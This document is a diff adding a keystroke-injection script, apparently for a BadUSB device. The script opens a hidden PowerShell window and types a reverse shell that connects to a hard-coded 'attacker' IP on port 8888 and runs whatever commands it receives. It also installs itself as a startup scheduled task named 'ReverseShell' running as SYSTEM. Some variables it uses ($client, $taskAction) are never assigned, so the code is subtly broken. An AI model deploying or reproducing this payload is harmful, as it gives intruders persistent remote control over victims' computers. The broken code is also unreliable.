@@ -1,0 +1,8 @@
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING "$attackerIP = '172.21.123.146'; $port = 8888; $scriptPath = $MyInvocation.MyCommand.Path; New-Object System.Net.Sockets.TCPClient($attackerIP, $port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); Set-Content -Path $env:APPDATA\reverse.ps1 -Value $(Get-Content -Path $scriptPath -Raw -Encoding Default); New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File $env:APPDATA\reverse.ps1'; $taskTrigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'ReverseShell' -Action $taskAction -Trigger $taskTrigger -User 'SYSTEM' -RunLevel Highest -Force"
+ENTER
